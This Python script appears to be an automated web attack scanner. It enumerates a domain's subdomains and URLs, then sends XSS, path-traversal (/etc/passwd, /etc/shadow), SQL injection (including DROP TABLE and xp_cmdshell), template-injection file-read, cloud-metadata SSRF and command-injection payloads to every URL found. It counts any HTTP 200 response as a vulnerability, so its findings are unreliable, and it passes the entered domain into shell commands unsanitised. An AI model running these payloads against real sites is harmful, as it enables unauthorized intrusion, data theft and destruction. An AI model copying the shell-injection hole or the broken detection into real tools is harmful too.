import subprocess
import os
import urllib.parse
import json
import csv
from concurrent.futures import ThreadPoolExecutor

# Configurable concurrency
MAX_WORKERS = 20

# ANSI Colors
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Payload Categories (Doubled Amounts)
xss_payloads = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>", "<a href=javascript:alert(1)>Click</a>", "<div onmouseover=alert(1)>Hover</div>",
    "</script><script>alert(1)</script>", "<video><source onerror=alert(1)>", "<img src='x' onerror='alert(1)'/>", "<script>confirm('XSS')</script>",
    "<svg><desc>alert(1)</desc></svg>", "<link href='javascript:alert(1)'>", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
]

lfi_payloads = [
    "../../../../etc/passwd", "/../../../../etc/passwd", "../etc/passwd", "../../etc/shadow",
    "/var/log/nginx/access.log", "/proc/self/environ", "../../boot.ini", "/../../../../../../../../../etc/passwd",
    "/etc/passwd%00", "/../../../../etc/hostname", "/../../../../etc/motd", "/../../../../windows/system32/drivers/etc/hosts",
    "/../../../../../../../../../etc/shadow", "../../../../../var/www/html/.env", "../../../../../proc/version"
]

sqli_payloads = [
    "' OR 1=1 --", "' OR '1'='1", "admin'--", "' UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT username, password FROM users--", "' AND SLEEP(5)--", "'; DROP TABLE users;--",
    "' AND BENCHMARK(500000,MD5('test'))--", "'; EXEC xp_cmdshell('dir');--", "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' UNION SELECT 1,2,3 FROM information_schema.tables--", "' UNION SELECT null, version()--"
]

dom_xss_payloads = [
    "#<script>alert(1)</script>", "#<img src=x onerror=alert(1)>", "#<svg onload=alert(1)>", "#<a href=javascript:alert(1)>Click</a>",
    "#<iframe src='javascript:alert(1)'></iframe>", "#<button onclick=alert(1)>Click</button>", "#javascript:alert(1)", "#data:text/html,<script>alert(1)</script>"
]

ssti_payloads = [
    "{{7*7}}", "{{config['SECRET_KEY']}}", "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    "{{request.application.__globals__.__builtins__.open('/etc/passwd').read() }}", "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read() }}",
    "{{loop.controls}}{{config}}", "{{request['application']['__globals__']['__builtins__']['open']('/etc/passwd').read()}}"
]

ssrf_payloads = [
    "http://169.254.169.254/", "http://127.0.0.1/", "http://localhost/", "http://metadata.google.internal/computeMetadata/v1/",
    "http://[::1]/", "http://0.0.0.0/", "http://169.254.169.254/latest/meta-data/", "http://example.com@127.0.0.1/"
]

rce_payloads = [
    "`id`", "id", "$(id)", "$(whoami)", "`whoami`", "|id", "|whoami", "`uname -a`", "$(uname -a)", "$(ls -al)",
    "`ls -al`", ";id", "||id", "&id", "`cat /etc/passwd`", "$(cat /etc/passwd)", "`cat /etc/shadow`", "$(cat /etc/shadow)"
]

# Encoding Function
def encode_payload(payload):
    """Encode the payload using URL encoding."""
    return urllib.parse.quote(payload)


# URL Collection
def get_domain():
    """Prompt the user to enter a domain."""
    domain = input(f"{BLUE}Enter domain: {RESET}").strip()
    return domain


def collect_urls(domain):
    """Run tools to collect URLs from the domain."""
    print(f"{BLUE}\nCollecting URLs...{RESET}")
    try:
        # Run assetfinder and save output
        subprocess.run(
            f"assetfinder {domain} | httprobe | tee {domain}_urls.txt",
            shell=True,
            check=True,
        )
        # Run subfinder and append output
        subprocess.run(
            f"subfinder -all -d {domain} | httprobe >> {domain}_urls.txt",
            shell=True,
            check=True,
        )
        # Run urlfinder and append output
        subprocess.run(
            f"urlfinder -d {domain} >> {domain}_urls.txt",
            shell=True,
            check=True,
        )
        # Run gospider and append output
        subprocess.run(
            f"gospider -s https://{domain} -d 7 -w -a >> {domain}_urls.txt",
            shell=True,
            check=True,
        )
        # Remove duplicate URLs and save final output
        subprocess.run(
            f"cat {domain}_urls.txt | sort -u | tee real_output.txt",
            shell=True,
            check=True,
        )
        print(f"{GREEN}\nURL collection complete. Saved to real_output.txt.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}Error during URL collection: {e}{RESET}")
        exit(1)


# Vulnerability Testing
def test_url_with_payloads(url, payloads, test_type, results):
    """Test a URL with a list of payloads."""
    for payload in payloads:
        encoded_payload = encode_payload(payload)
        test_url = f"{url}?param={encoded_payload}"
        print(f"{YELLOW}[{test_type}] Testing: {test_url}{RESET}")
        try:
            result = subprocess.run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", test_url],
                capture_output=True,
                text=True,
                check=True,
            )
            status_code = result.stdout.strip()
            if status_code == "200":
                print(f"{GREEN}[{test_type}] Success: {test_url}{RESET}")
                results.append(
                    {"url": test_url, "type": test_type, "payload": payload, "status": "Potential Vulnerability"}
                )
            else:
                results.append(
                    {"url": test_url, "type": test_type, "payload": payload, "status": f"Failed (Status: {status_code})"}
                )
        except subprocess.CalledProcessError as e:
            print(f"{RED}Error testing {test_url}: {e}{RESET}")


def analyze_url(url, results):
    """Analyze a URL for vulnerabilities."""
    print(f"\n{BLUE}Analyzing {url}...{RESET}")
    test_url_with_payloads(url, xss_payloads, "XSS", results)
    test_url_with_payloads(url, lfi_payloads, "LFI", results)
    test_url_with_payloads(url, sqli_payloads, "SQLi", results)
    test_url_with_payloads(url, dom_xss_payloads, "DOM XSS", results)
    test_url_with_payloads(url, ssti_payloads, "SSTI", results)
    test_url_with_payloads(url, ssrf_payloads, "SSRF", results)
    test_url_with_payloads(url, rce_payloads, "RCE", results)


def process_urls(file_path):
    """Process each URL in the file."""
    if not os.path.exists(file_path):
        print(f"{RED}URL file not found: {file_path}{RESET}")
        return

    with open(file_path, "r") as file:
        urls = [url.strip() for url in file.readlines() if url.strip()]

    print(f"{BLUE}\nProcessing {len(urls)} URLs for vulnerabilities...{RESET}")
    results = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        executor.map(lambda u: analyze_url(u, results), urls)

    save_results(results)


# Save Results
def save_results(results):
    """Save results to JSON and CSV files."""
    json_file = "results.json"
    csv_file = "results.csv"

    # Save to JSON
    with open(json_file, "w") as jf:
        json.dump(results, jf, indent=4)
    print(f"{GREEN}\nResults saved to {json_file}.{RESET}")

    # Save to CSV
    with open(csv_file, "w", newline="") as cf:
        writer = csv.DictWriter(cf, fieldnames=["url", "type", "payload", "status"])
        writer.writeheader()
        writer.writerows(results)
    print(f"{GREEN}Results saved to {csv_file}.{RESET}")


# Main Function
def main():
    domain = get_domain()
    collect_urls(domain)
    print(f"{BLUE}\nProcessing URLs for vulnerabilities...{RESET}")
    process_urls("real_output.txt")
    print(f"{GREEN}\nAnalysis complete.{RESET}")


if __name__ == "__main__":
    main()
